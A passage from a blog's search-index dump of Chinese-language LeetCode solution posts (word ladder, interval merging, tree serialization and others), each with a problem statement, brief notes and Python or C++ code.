self.f(i-1,cnt-self.nums[i]) def canPartition(self, nums: List[int]) -\u0026gt; bool: cnt = sum(nums) self.nums = nums if cnt % 2 == 1: return False cnt = cnt // 2 return self.f(len(nums)-1,cnt) ","permalink":"https://littlebees.github.io/2021/01/leetcode-416-partition-equal-subset-sum/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e真的就是DPㄟ\u003c/p\u003e","title":"leetcode-416 - Partition Equal Subset Sum"},{"content":"動機 同樣的點好可怕\nProblem Given an array of points where points[i] = [xi, yi] represents a point on the X-Y plane, return the maximum number of points that lie on the same straight line.\nExample 1:\nInput: points = [[1,1],[2,2],[3,3]]Output: 3Example 2:\nInput: points = [[1,1],[3,2],[5,3],[4,1],[2,3],[1,4]]Output: 4 Constraints:\n1 \u003c= points.length \u003c= 300points[i].length == 2-104 \u003c= xi, yi \u003c= 104All the points are unique. Sol 先依照x與y軸排序，再從每個點去看所有右手邊的點，統計所有斜率\n這裡有兩個重點\n斜率不能用float存，不然可能算出來會不一樣，所以要用pair 看所有右手邊的點還是會重疊，所以每次看完要去更新大表看有沒有比他多 還有一個很可怕的，同樣的點可以出現很多次，所以在計算斜率有多少點時，要加上這個點出現的次數\nclass Solution: def maxPoints(self, points: List[List[int]]) -\u0026gt; int: if len(points) \u0026lt;= 1: return len(points) points = [(p[0],p[1]) for p in points] points = Counter(points) global_cnt = {None: max(points.values())} ps = list(points.keys()) ps.sort(key=lambda x: (x[0],x[1])) for i in range(len(ps)): local_cnt = {} for j in range(i+1,len(ps)): a, b = ps[j][1]-ps[i][1], ps[j][0]-ps[i][0] c = max(1,math.gcd(abs(a),abs(b))) slope = (a//c, b//c) if slope not in local_cnt: local_cnt[slope] = points[ps[j]] else: local_cnt[slope] += points[ps[j]] #print((a//c, b//c), ps[i], ps[j]) for k in local_cnt: global_cnt[k] = max(global_cnt.get(k,0), local_cnt[k]+ points[ps[i]]) #print(global_cnt) return max(global_cnt.values()) ","permalink":"https://littlebees.github.io/2021/01/leetcode-149-max-points-on-a-line/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e同樣的點好可怕\u003c/p\u003e","title":"leetcode-149 - Max Points on a Line"},{"content":"動機 原來 中序加前序去重建tree是有限制的，val不能重複!!\nProblem Serialization is the process of converting a data structure or object into a sequence of bits so that it can be stored in a file or memory buffer, or transmitted across a network connection link to be reconstructed later in the same or another computer environment.\nDesign an algorithm to serialize and deserialize a binary tree. There is no restriction on how your serialization/deserialization algorithm should work. You just need to ensure that a binary tree can be serialized to a string and this string can be deserialized to the original tree structure.\nClarification: The input/output format is the same as how LeetCode serializes a binary tree. You do not necessarily need to follow this format, so please be creative and come up with different approaches yourself.\nExample 1:\nInput: root = [1,2,3,null,null,4,5]Output: [1,2,3,null,null,4,5]Example 2:\nInput: root = []Output: []Example 3:\nInput: root = [1]Output: [1]Example 4:\nInput: root = [1,2]Output: [1,2] Constraints:\nThe number of nodes in the tree is in the range [0, 104].-1000 \u003c= Node.val \u003c= 1000 Sol: dfs 不論哪一種走訪，都是看序列化時怎麼走，反序列化就照著走\nclass Codec: def inorder(self,r): if not r: self.ino.append(\u0026#39;x\u0026#39;) else: self.ino.append(str(r.val)) self.inorder(r.left) self.inorder(r.right) def serialize(self, root): if not root: return \u0026#34;\u0026#34; else: self.ino = [] self.inorder(root) #print(self.ino) return \u0026#39;,\u0026#39;.join(self.ino) def dfs(self): self.i += 1 if self.data[self.i] != \u0026#39;x\u0026#39;: root = TreeNode() root.val = int(self.data[self.i]) root.left = self.dfs() root.right = self.dfs() return root else: return None def deserialize(self, data): if not data: return None self.data = data.split(\u0026#39;,\u0026#39;) self.i = -1 return self.dfs() Sol: bfs class Codec: def serialize(self, root): if not root: return \u0026#34;\u0026#34; else: ret = [] q = deque([root]) while q: tmp = q.popleft() if tmp: ret.append(str(tmp.val)) q.append(tmp.left) q.append(tmp.right) else: ret.append(\u0026#39;x\u0026#39;) return \u0026#39;,\u0026#39;.join(ret) def deserialize(self, data): if not data: return None else: data = data.split(\u0026#39;,\u0026#39;) ret = TreeNode() ret.val = int(data[0]) q = deque([ret]) i = 1 while q and i \u0026lt; len(data): root = q.popleft() now = data[i] if i \u0026lt; len(data) else \u0026#39;x\u0026#39; if now != \u0026#39;x\u0026#39;: root.left = TreeNode() root.left.val = int(now) q.append(root.left) i += 1 now = data[i] if i \u0026lt; len(data) else \u0026#39;x\u0026#39; if now != \u0026#39;x\u0026#39;: root.right = TreeNode() root.right.val = int(now) q.append(root.right) i += 1 return ret ","permalink":"https://littlebees.github.io/2021/01/leetcode-297-serialize-and-deserialize-binary-tree/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e原來 中序加前序去重建tree是有限制的，val不能重複!!\u003c/p\u003e","title":"leetcode-297 - Serialize and Deserialize Binary Tree"},{"content":"動機 感覺回文的DP就是判斷是不是回文ㄟ\nProblem Given a string s, partition s such that every substring of the partition is a palindrome. Return all possible palindrome partitioning of s.\nA palindrome string is a string that reads the same backward as forward.\nExample 1:\nInput: s = aabOutput: [[a,a,b],[aa,b]]Example 2:\nInput: s = aOutput: [[a]] Constraints:\n1 \u003c= s.length \u003c= 16s contains only lowercase English letters. Sol 用DP做回文判斷的方式，之後就是backtracking一路列舉下去\nclass Solution: @functools.cache def isPalin(self,i,j): if j-i \u0026lt; 0: return False elif j-i == 1 or j-i == 0: return True else: return (self.s[i] == self.s[j-1]) and self.isPalin(i+1,j-1) def dfs(self,i,acc=[]): #print(self.s[i:j],self.isPalin(i,j)) if i \u0026gt;= len(self.s): return [acc] else: ret = [] for k in range(i+1,len(self.s)+1): #print(self.s[i:k],self.isPalin(i,k),self.s[k:j],self.isPalin(k,j)) if self.isPalin(i,k): ret += self.dfs(k,acc+[self.s[i:k]]) #print(i,j,ret) return ret def partition(self, s: str) -\u0026gt; List[List[str]]: self.s = s return self.dfs(0) ","permalink":"https://littlebees.github.io/2021/01/leetcode-131-palindrome-partitioning/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e感覺回文的DP就是判斷是不是回文ㄟ\u003c/p\u003e","title":"leetcode-131 - Palindrome Partitioning"},{"content":"動機 除了到根的，還有左右兩邊接起來的\nProblem Given the root of a binary tree, return the length of the diameter of the tree.\nThe diameter of a binary tree is the length of the longest path between any two nodes in a tree. This path may or may not pass through the root.\nThe length of a path between two nodes is represented by the number of edges between them.\nExample 1:\nInput: root = [1,2,3,4,5]Output: 3Explanation: 3 is the length of the path [4,2,1,3] or [5,2,1,3].Example 2:\nInput: root = [1,2]Output: 1 Constraints:\nThe number of nodes in the tree is in the range [1, 104].-100 \u003c= Node.val \u003c= 100 Sol 用dfs求leaf到root的最長距離，同時在node更新最大值\nclass Solution: def dfs(self,r): if not r: return 0 else: left = self.dfs(r.left) right = self.dfs(r.right) self.ret = max(self.ret, left+right) return max(left,right)+1 def diameterOfBinaryTree(self, root: TreeNode) -\u0026gt; int: self.ret = 0 self.dfs(root) return self.ret ","permalink":"https://littlebees.github.io/2021/01/leetcode-543-diameter-of-binary-tree/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e除了到根的，還有左右兩邊接起來的\u003c/p\u003e","title":"leetcode-543 - Diameter of Binary Tree"},{"content":"動機 heapq是不是比較慢啊\nProblem Given integer array nums, return the third maximum number in this array. If the third maximum does not exist, return the maximum number.\nExample 1:\nInput: nums = [3,2,1]Output: 1Explanation: The third maximum is 1.Example 2:\nInput: nums = [1,2]Output: 2Explanation: The third maximum does not exist, so the maximum (2) is returned instead.Example 3:\nInput: nums = [2,2,3,1]Output: 1Explanation: Note that the third maximum here means the third maximum distinct number.Both numbers with value 2 are both considered as second maximum. Constraints:\n1 \u003c= nums.length \u003c= 104-231 \u003c= nums[i] \u003c= 231 - 1 Follow up: Can you find an O(n) solution? Sol 用heapq排序\nclass Solution: def thirdMax(self, nums: List[int]) -\u0026gt; int: maxs = [] nums = list(set(nums)) for n in nums: heappush(maxs,n) if len(maxs) \u0026gt; 3: heappop(maxs) print(maxs) return min(maxs) if len(maxs) == 3 else max(maxs) 無腦一點用sort\nclass Solution: def thirdMax(self, nums: List[int]) -\u0026gt; int: nums = list(set(nums)) nums.sort(reverse=True) if len(nums) \u0026lt; 3: return nums[0] else: return nums[2] ","permalink":"https://littlebees.github.io/2021/01/leetcode-414-third-maximum-number/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003eheapq是不是比較慢啊\u003c/p\u003e","title":"leetcode-414 - Third Maximum Number"},{"content":"動機 這題很經典，在programming pearls有出現過\nProblem Given an array nums of n integers where nums[i] is in the range [1, n], return an array of all the integers in the range [1, n] that do not appear in nums.\nExample 1:\nInput: nums = [4,3,2,7,8,2,3,1]Output: [5,6]Example 2:\nInput: nums = [1,1]Output: [2] Constraints:\nn == nums.length1 \u003c= n \u003c= 1051 \u003c= nums[i] \u003c= n Follow up: Could you do it without extra space and in O(n) runtime? You may assume the returned list does not count as extra space.\nSol 注意到內容物如果排序完，會與對應的index差一\n可以利用這個特性，把目前不適合的換到適合的位置，一路換到最後 之後就是直接看有哪個不是內容物與index差一的就是要找的\n這種在同一個位置一直換換是個經典的手法，很有趣\nclass Solution: def findDisappearedNumbers(self, nums: List[int]) -\u0026gt; List[int]: for i in range(len(nums)): while nums[i]-1 != i and nums[nums[i]-1] != nums[i]: tmp = nums[i] nums[i] = nums[tmp-1] nums[tmp-1] = tmp ret = [] for i in range(len(nums)): if nums[i]-1 != i: ret.append(i+1) return ret ","permalink":"https://littlebees.github.io/2021/01/leetcode-448-find-all-numbers-disappeared-in-an-array/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e這題很經典，在programming pearls有出現過\u003c/p\u003e","title":"leetcode-448 - Find All Numbers Disappeared in an Array"},{"content":"動機 神奇的indexing\nProblem Given an integer array nums, reorder it such that nums[0] \u003c nums[1] \u003e nums[2] \u003c nums[3]....\nYou may assume the input array always has a valid answer.\nExample 1:\nInput: nums = [1,5,1,1,6,4]Output: [1,6,1,5,1,4]Explanation: [1,4,1,5,1,6] is also accepted.Example 2:\nInput: nums = [1,3,2,2,3,1]Output: [2,3,1,3,1,2] Constraints:\n1 \u003c= nums.length \u003c= 5 * 1040 \u003c= nums[i] \u003c= 5000It is guaranteed that there will be an answer for the given input nums. Follow Up: Can you do it in O(n) time and/or in-place with O(1) extra space? Sol 每次遇到整數除法都很頭痛，如果沒有處理好就是錯\n排序後折半，從最後去塞\n這裡要讓小的部分多拿一點，看奇數長度的例子，就會發現小的一定在最後一個\nclass Solution: def wiggleSort(self, nums: List[int]) -\u0026gt; None: \u0026#34;\u0026#34;\u0026#34; Do not return anything, modify nums in-place instead. \u0026#34;\u0026#34;\u0026#34; tmp = [x for x in nums] tmp.sort() a = (len(nums)//2 if len(nums) % 2 == 0 else (len(nums)+1)//2)-1 # a = ((len(nums)+1)//2)-1 b = len(nums)-1 for i in range(len(nums)): if i % 2 == 0: nums[i] = tmp[a] a -= 1 else: nums[i] = tmp[b] b -= 1 Case study 第一個是用nth_element把array分成左右兩邊\n第二個用A(i)把\nA的前半對應到nums上應該放大數字的部分 A的後半對應到nums上應該放小數字的部分 Accessing A(0) actually accesses nums[1]. Accessing A(1) actually accesses nums[3]. Accessing A(2) actually accesses nums[5]. Accessing A(3) actually accesses nums[7]. Accessing A(4) actually accesses nums[9]. Accessing A(5) actually accesses nums[0]. Accessing A(6) actually accesses nums[2]. Accessing A(7) actually accesses nums[4]. Accessing A(8) actually accesses nums[6]. Accessing A(9) actually accesses nums[8]. 從上面可以看出，在替A(i)切半時應該把前半的長度壓小一點，理由在Sol，所以這邊mid就是直接除2就好\nvoid wiggleSort(vector\u0026lt;int\u0026gt;\u0026amp; nums) { int n = nums.size(); // Find a median. auto midptr = nums.begin() + n / 2; nth_element(nums.begin(), midptr, nums.end()); int mid = *midptr; // Index-rewiring. #define A(i) nums[(1+2*(i)) % (n|1)] // j :: iterate through A() int i = 0, j = 0, k = n - 1; while (j \u0026lt;= k) { if (A(j) \u0026gt; mid) swap(A(i++), A(j++)); // expand 大數字的範圍 else if (A(j) \u0026lt; mid) swap(A(j), A(k--)); // expand 小數字的範圍 else j++; } } ","permalink":"https://littlebees.github.io/2021/01/leetcode-324-wiggle-sort-ii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e神奇的indexing\u003c/p\u003e","title":"leetcode-324 - Wiggle Sort II"},{"content":"動機 原本就直接用trie，但看了別的解答才發現可以看長度來區分再直接比!!\n重點是這樣居然比較快!! (in Py)\nProblem Design a data structure that supports adding new words and finding if a string matches any previously added string.\nImplement the WordDictionary class:\nWordDictionary() Initializes the object.void addWord(word) Adds word to the data structure, it can be matched later.bool search(word) Returns true if there is any string in the data structure that matches word or false otherwise. word may contain dots '.' where dots can be matched with any letter. Example:\nInput[WordDictionary,addWord,addWord,addWord,search,search,search,search][[],[bad],[dad],[mad],[pad],[bad],[.ad],[b..]]Output[null,null,null,null,false,true,true,true]ExplanationWordDictionary wordDictionary = new WordDictionary();wordDictionary.addWord(bad);wordDictionary.addWord(dad);wordDictionary.addWord(mad);wordDictionary.search(pad); // return FalsewordDictionary.search(bad); // return TruewordDictionary.search(.ad); // return TruewordDictionary.search(b..); // return True Constraints:\n1 \u003c= word.length \u003c= 500word in addWord consists lower-case English letters.word in search consist of '.' or lower-case English letters.At most 50000 calls will be made to addWord and search. Sol 用trie與dfs\ndef dfs(word,trie): tmp = trie for i in range(len(word)): if word[i] == \u0026#34;.\u0026#34;: for k in tmp[1].keys(): if dfs(word[i+1:],tmp[1][k]): return True return False elif word[i] in tmp[1]: tmp = tmp[1][word[i]] else: return False return tmp[0] class WordDictionary: def __init__(self): \u0026#34;\u0026#34;\u0026#34; Initialize your data structure here. \u0026#34;\u0026#34;\u0026#34; self.trie = [False, {}] def addWord(self, word: str) -\u0026gt; None: tmp = self.trie for c in word: if c not in tmp[1]: tmp[1][c] = [False, {}] tmp = tmp[1][c] tmp[0] = True def search(self, word: str) -\u0026gt; bool: return dfs(word,self.trie) case study 把同長度的單字放在一起，之後就直接比\n這樣在python居然比較快!?\nclass WordDictionary: def __init__(self): \u0026#34;\u0026#34;\u0026#34; Initialize your data structure here. \u0026#34;\u0026#34;\u0026#34; self.d = defaultdict(set) def addWord(self, word: str) -\u0026gt; None: self.d[len(word)].add(word) def search(self, word: str) -\u0026gt; bool: s = self.d[len(word)] if \u0026#39;.\u0026#39; not in word: return word in s def match(a, b): for i in range(len(a)): if a[i] != \u0026#39;.\u0026#39; and a[i] != b[i]: # word not match return False return True for w in s: if match(word, w): return True return False ","permalink":"https://littlebees.github.io/2021/01/leetcode-211-design-add-and-search-words-data-structure/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e原本就直接用trie，但看了別的解答才發現可以看長度來區分再直接比!!\u003c/p\u003e\n\u003cp\u003e重點是這樣居然比較快!! (in Py)\u003c/p\u003e","title":"leetcode-211 - Design Add and Search Words Data Structure"},{"content":"動機 要會看input決定要用什麼做法\nProblem You are given two integer arrays nums1 and nums2 sorted in ascending order and an integer k.\nDefine a pair (u, v) which consists of one element from the first array and one element from the second array.\nReturn the k pairs (u1, v1), (u2, v2), ..., (uk, vk) with the smallest sums.\nExample 1:\nInput: nums1 = [1,7,11], nums2 = [2,4,6], k = 3Output: [[1,2],[1,4],[1,6]]Explanation: The first 3 pairs are returned from the sequence: [1,2],[1,4],[1,6],[7,2],[7,4],[11,2],[7,6],[11,4],[11,6]Example 2:\nInput: nums1 = [1,1,2], nums2 = [1,2,3], k = 2Output: [[1,1],[1,1]]Explanation: The first 2 pairs are returned from the sequence: [1,1],[1,1],[1,2],[2,1],[1,2],[2,2],[1,3],[1,3],[2,3]Example 3:\nInput: nums1 = [1,2], nums2 = [3], k = 3Output: [[1,3],[2,3]]Explanation: All possible pairs are returned from the sequence: [1,3],[2,3] Constraints:\n1 \u003c= nums1.length, nums2.length \u003c= 105-109 \u003c= nums1[i], nums2[i] \u003c= 109nums1 and nums2 both are sorted in ascending order.1 \u003c= k \u003c= 1000 Sol 先生完所有組合，再挑\nclass Solution: def kSmallestPairs(self, nums1: List[int], nums2: List[int], k: int) -\u0026gt; List[List[int]]: q = [] for n1 in nums1: for n2 in nums2: heappush(q,(n1+n2, (n1,n2))) ret = [] for _ in range(k): if q: tmp = heappop(q) ret.append(tmp[1]) else: break return ret Sol: 四連棋 用一個array紀錄nums1的每個index的要從哪個nums2的index開始找\n這樣就可以一次一次找出最小的pair\nclass Solution: def kSmallestPairs(self, nums1: List[int], nums2: List[int], k: int) -\u0026gt; List[List[int]]: idx_for_num1_to_start = [0]*len(nums1) ret = [] for _ in range(min(k,len(nums1)*len(nums2))): cnt = math.inf minIdx = 0 for i in range(len(nums1)): now = idx_for_num1_to_start[i] if now \u0026lt; len(nums2) and cnt \u0026gt;= nums1[i]+nums2[now]: minIdx = i cnt = nums1[i]+nums2[now] ret.append([nums1[minIdx],nums2[idx_for_num1_to_start[minIdx]]]) idx_for_num1_to_start[minIdx] += 1 return ret ","permalink":"https://littlebees.github.io/2021/01/leetcode-373-find-k-pairs-with-smallest-sums/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e要會看input決定要用什麼做法\u003c/p\u003e","title":"leetcode-373 - Find K Pairs with Smallest Sums"},{"content":"動機 有用硬幹的感覺\nProblem Given an array of distinct integers nums and a target integer target, return the number of possible combinations that add up to target.\nThe answer is guaranteed to fit in a 32-bit integer.\nExample 1:\nInput: nums = [1,2,3], target = 4Output: 7Explanation:The possible combination ways are:(1, 1, 1, 1)(1, 1, 2)(1, 2, 1)(1, 3)(2, 1, 1)(2, 2)(3, 1)Note that different sequences are counted as different combinations.Example 2:\nInput: nums = [9], target = 3Output: 0 Constraints:\n1 \u003c= nums.length \u003c= 2001 \u003c= nums[i] \u003c= 1000All the elements of nums are unique.1 \u003c= target \u003c= 1000 Follow up: What if negative numbers are allowed in the given array? How does it change the problem? What limitation we need to add to the question to allow negative numbers?\nSol f(cnt)代表cnt的最大組合數，接下來就是遞迴+記憶法\nclass Solution: @functools.cache def f(self,cnt): if cnt \u0026lt; 0: return 0 elif cnt == 0: return 1 else: ret = 0 for n in self.nums: ret += self.f(cnt-n) return ret def combinationSum4(self, nums: List[int], target: int) -\u0026gt; int: self.nums = nums return self.f(target) ","permalink":"https://littlebees.github.io/2021/01/leetcode-377-combination-sum-iv/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e有用硬幹的感覺\u003c/p\u003e","title":"leetcode-377 - Combination Sum IV"},{"content":"動機 只要看出怎麼遞迴，剩下就是細心的問題\nProblem The string PAYPALISHIRING is written in a zigzag pattern on a given number of rows like this: (you may want to display this pattern in a fixed font for better legibility)\nP A H NA P L S I I GY I RAnd then read line by line: PAHNAPLSIIGYIR\nWrite the code that will take a string and make this conversion given a number of rows:\nstring convert(string s, int numRows); Example 1:\nInput: s = PAYPALISHIRING, numRows = 3Output: PAHNAPLSIIGYIRExample 2:\nInput: s = PAYPALISHIRING, numRows = 4Output: PINALSIGYAHRPIExplanation:P I NA L S I GY A H RP IExample 3:\nInput: s = A, numRows = 1Output: A Constraints:\n1 \u003c= s.length \u003c= 1000s consists of English letters (lower-case and upper-case), ',' and '.'.1 \u003c= numRows \u003c= 1000 Sol 可以把pattern切成下面的樣子\nP | A | H | N A P | L S | I I | G Y | I | R 這樣就可以把整個分成\n(row是3，總長n是2*row-2在此是4)\nP(i:0) A(i:1) P(i:n-1) Y(i:n-2) (row是4，總長n是2*row-2在此是6)\nP(i:0) A(i:1) L(i:n-1) Y(i:2) A(i:n-2) P(i:n-3) 這樣就可以解了\nclass Solution: def convert(self, s: str, n: int) -\u0026gt; str: if n == 1: return s sub_len = (n-1)*2 ret = [] for i in range(n): start = 0 while start \u0026lt; len(s): sub = s[start:start+sub_len] if i == 0 or i == n-1: if i \u0026lt; len(sub): ret.append(sub[i]) else: if i \u0026lt; len(sub): ret.append(sub[i]) if sub_len-i \u0026lt; len(sub): ret.append(sub[sub_len-i]) start += sub_len return \u0026#39;\u0026#39;.join(ret) 第一個就是\n","permalink":"https://littlebees.github.io/2021/01/leetcode-6-zigzag-conversion/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e只要看出怎麼遞迴，剩下就是細心的問題\u003c/p\u003e","title":"leetcode-6 - ZigZag Conversion"},{"content":"動機 先把interval混進去，再跑merge interval\nProblem Given a set of non-overlapping intervals, insert a new interval into the intervals (merge if necessary).\nYou may assume that the intervals were initially sorted according to their start times.\nExample 1:\nInput: intervals = [[1,3],[6,9]], newInterval = [2,5]Output: [[1,5],[6,9]]Example 2:\nInput: intervals = [[1,2],[3,5],[6,7],[8,10],[12,16]], newInterval = [4,8]Output: [[1,2],[3,10],[12,16]]Explanation: Because the new interval [4,8] overlaps with [3,5],[6,7],[8,10].Example 3:\nInput: intervals = [], newInterval = [5,7]Output: [[5,7]]Example 4:\nInput: intervals = [[1,5]], newInterval = [2,3]Output: [[1,5]]Example 5:\nInput: intervals = [[1,5]], newInterval = [2,7]Output: [[1,7]] Constraints:\n0 \u003c= intervals.length \u003c= 104intervals[i].length == 20 \u003c= intervals[i][0] \u003c= intervals[i][1] \u003c= 105intervals is sorted by intervals[i][0] in ascending order.newInterval.length == 20 \u003c= newInterval[0] \u003c= newInterval[1] \u003c= 105 Sol class Solution: def insert(self, ins: List[List[int]], new: List[int]) -\u0026gt; List[List[int]]: stk = [] ins.insert(bisect_left([i[0] for i in ins], new[0]),new) for i in ins: while stk and i[0] \u0026lt;= stk[-1][1]: tmp = stk.pop() i = [min(i[0],tmp[0]), max(i[1],tmp[1])] stk.append(i) return stk ","permalink":"https://littlebees.github.io/2021/01/leetcode-57-insert-interval/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e先把interval混進去，再跑merge interval\u003c/p\u003e","title":"leetcode-57 - Insert Interval"},{"content":"動機 當初想用處理interval的老套路，stack去做，一直gg 直到看解答才發現，原來這麼簡單\nProblem Given an array of intervals intervals where intervals[i] = [starti, endi], return the minimum number of intervals you need to remove to make the rest of the intervals non-overlapping.\nExample 1:\nInput: intervals = [[1,2],[2,3],[3,4],[1,3]]Output: 1Explanation: [1,3] can be removed and the rest of the intervals are non-overlapping.Example 2:\nInput: intervals = [[1,2],[1,2],[1,2]]Output: 2Explanation: You need to remove two [1,2] to make the rest of the intervals non-overlapping.Example 3:\nInput: intervals = [[1,2],[2,3]]Output: 0Explanation: You don't need to remove any of the intervals since they're already non-overlapping. Constraints:\n1 \u003c= intervals.length \u003c= 105intervals[i].length == 2-5 * 104 \u003c= starti \u003c endi \u003c= 5 * 104 Sol 如果有overlap就一定會刪一個 刪end最大的那一個 class Solution: def eraseOverlapIntervals(self, ins: List[List[int]]) -\u0026gt; int: ins.sort(key=lambda x: x[0]) ret = 0 last = 0 for i in range(1,len(ins)): if ins[i][0] \u0026lt; ins[last][1]: ret += 1 if ins[i][1] \u0026lt; ins[last][1]: last = i else: last = i return ret ","permalink":"https://littlebees.github.io/2021/01/leetcode-435-non-overlapping-intervals/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e當初想用處理interval的老套路，stack去做，一直gg\n直到看解答才發現，原來這麼簡單\u003c/p\u003e","title":"leetcode-435 - Non-overlapping Intervals"},{"content":"動機 重點是怎麼找下一個!! 讓每一次擴展狀態都是有用的，少做許多無用功\nProblem A transformation sequence from word beginWord to word endWord using a dictionary wordList is a sequence of words beginWord -\u003e s1 -\u003e s2 -\u003e ... -\u003e sk such that:\nEvery adjacent pair of words differs by a single letter.Every si for 1 \u003c= i \u003c= k is in wordList. Note that beginWord does not need to be in wordList.sk == endWordGiven two words, beginWord and endWord, and a dictionary wordList, return the number of words in the shortest transformation sequence from beginWord to endWord, or 0 if no such sequence exists.\nExample 1:\nInput: beginWord = hit, endWord = cog, wordList = [hot,dot,dog,lot,log,cog]Output: 5Explanation: One shortest transformation sequence is hit -\u003e hot -\u003e dot -\u003e dog -\u003e cog, which is 5 words long.Example 2:\nInput: beginWord = hit, endWord = cog, wordList = [hot,dot,dog,lot,log]Output: 0Explanation: The endWord cog is not in wordList, therefore there is no valid transformation sequence. Constraints:\n1 \u003c= beginWord.length \u003c= 10endWord.length == beginWord.length1 \u003c= wordList.length \u003c= 5000wordList[i].length == beginWord.lengthbeginWord, endWord, and wordList[i] consist of lowercase English letters.beginWord != endWordAll the words in wordList are unique. Sol1: Trie + BFS 用trie來看是不是下一個點，不過真的很慢\nclass Solution: def buildTrie(self,ws): for w in ws: tmp = self.trie for c in w: if c not in tmp[1]: tmp[1][c] = [False, {}] tmp = tmp[1][c] tmp[0] = True def getCandidates(self,root,w,i=0,can=\u0026#34;\u0026#34;,acc=1): if i == len(w): return [can] if root[0] or acc \u0026gt; 0 else [] else: ret = [] for k in root[1]: if k == w[i]: ret += self.getCandidates(root[1][k],w,i+1,can+k,acc) elif acc \u0026gt; 0: ret += self.getCandidates(root[1][k],w,i+1,can+k,acc-1) return ret def bfs(self,start,end): ret = 0 q = deque([[start]]) seen = set() while q: print(q) ws = q.popleft() if end in ws: return ret+1 seen.update(ws) candidates = [] for w in ws: tmp = self.getCandidates(self.trie,w) candidates += [s for s in tmp if s not in seen] if candidates: q.appendleft(candidates) ret += 1 return 0 def ladderLength(self, start: str, end: str, ws: List[str]) -\u0026gt; int: self.trie = [False, {}] self.buildTrie(ws) return self.bfs(start,end) Sol2: Hash + BFS 剛剛是從起點去比每個單字，這樣擴張(queue變大)的速度就會變慢，同時還會出現許多已經比對過的，所以改成用碼掉一個字來看能不能到 dog =\u0026gt; d*g \u0026lt;= dig\n這樣就不用花時間去比本來就不是的單字，這個就是比第一個快的關鍵，每一次擴展狀態就是存在的，而不是先看是不是對的狀態再擴展\nclass Solution(object): def ladderLength(self, beginWord, endWord, wordList): if endWord not in wordList or not endWord or not beginWord or not wordList: return 0 L = len(beginWord) all_combo_dict = defaultdict(list) for word in wordList: for i in range(L): all_combo_dict[word[:i] + \u0026#34;*\u0026#34; + word[i+1:]].append(word) queue = collections.deque([(beginWord, 1)]) visited = {beginWord: True} while queue: current_word, level = queue.popleft() for i in range(L): intermediate_word = current_word[:i] + \u0026#34;*\u0026#34; + current_word[i+1:] for word in all_combo_dict[intermediate_word]: if word == endWord: return level + 1 if word not in visited: visited[word] = True queue.append((word, level + 1)) return 0 Sol: Hash + BFS *2 從起點與終點一起刷，只要有交會就是有\nfrom collections import defaultdict class Solution(object): def __init__(self): self.length = 0 self.all_combo_dict = defaultdict(list) def visitWordNode(self, queue, visited, others_visited): current_word, level = queue.popleft() for i in range(self.length): intermediate_word = current_word[:i] + \u0026#34;*\u0026#34; + current_word[i+1:] for word in self.all_combo_dict[intermediate_word]: if word in others_visited: return level + others_visited[word] if word not in visited: visited[word] = level + 1 queue.append((word, level + 1)) return None def ladderLength(self, beginWord, endWord, wordList): \u0026#34;\u0026#34;\u0026#34; :type beginWord: str :type endWord: str :type wordList: List[str] :rtype: int \u0026#34;\u0026#34;\u0026#34; if endWord not in wordList or not endWord or not beginWord or not wordList: return 0 self.length = len(beginWord) for word in wordList: for i in range(self.length): self.all_combo_dict[word[:i] + \u0026#34;*\u0026#34; + word[i+1:]].append(word) queue_begin = collections.deque([(beginWord, 1)]) # BFS starting from beginWord queue_end = collections.deque([(endWord, 1)]) # BFS starting from endWord visited_begin = {beginWord: 1} visited_end = {endWord: 1} ans = None while queue_begin and queue_end: # One hop from begin word ans = self.visitWordNode(queue_begin, visited_begin, visited_end) if ans: return ans # One hop from end word ans = self.visitWordNode(queue_end, visited_end, visited_begin) if ans: return ans return 0 ","permalink":"https://littlebees.github.io/2021/01/leetcode-127-word-ladder/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e重點是怎麼找下一個!!\n讓每一次擴展狀態都是有用的，少做許多無用功\u003c/p\u003e","title":"leetcode-127 - Word Ladder"},{"content":"動機 神奇的位元操作\nProblem Reverse bits of a given 32 bits unsigned integer.\nNote:\nNote that in some languages such as Java, there is no unsigned integer type. In this case, both input and output will be given as a signed integer type. They should not affect your implementation, as the integer's internal binary representation is the same, whether it is signed or unsigned.In Java, the compiler represents the signed integers using 2's complement notation. Therefore, in Example 2 above, the input represents the signed integer -3 and the output represents the signed integer -1073741825.Follow up:\nIf this function is called many times, how would you optimize it?\nExample 1:\nInput: n = 00000010100101000001111010011100Output: 964176192 (00111001011110000010100101000000)Explanation: The input binary string 00000010100101000001111010011100 represents the unsigned integer 43261596, so return 964176192 which its binary representation is 00111001011110000010100101000000.Example 2:\nInput: n = 11111111111111111111111111111101Output: 3221225471 (10111111111111111111111111111111)Explanation: The input binary string 11111111111111111111111111111101 represents the unsigned integer 4294967293, so return 3221225471 which its binary representation is 10111111111111111111111111111111. Constraints:\nThe input must be a binary string of length 32 Sol1: reverse by bit 就一般的reverse\nclass Solution: def reverseBits(self, n: int) -\u0026gt; int: n = list(format(n,\u0026#39;b\u0026#39;).zfill(32)) for i in range(16): tmp = n[i] n[i] = n[31-i] n[31-i] = tmp return int(\u0026#39;\u0026#39;.join(n),2) Sol2: reverse by byte 在ref中有在不用shift的byte reverse，因為變成byte，所以可能會看過重複的\n進而可以用記憶法!!\n這真的很有趣，在bit下就不能用記憶法，但是如果包成byte就可以用記憶法了，有趣!!\nclass 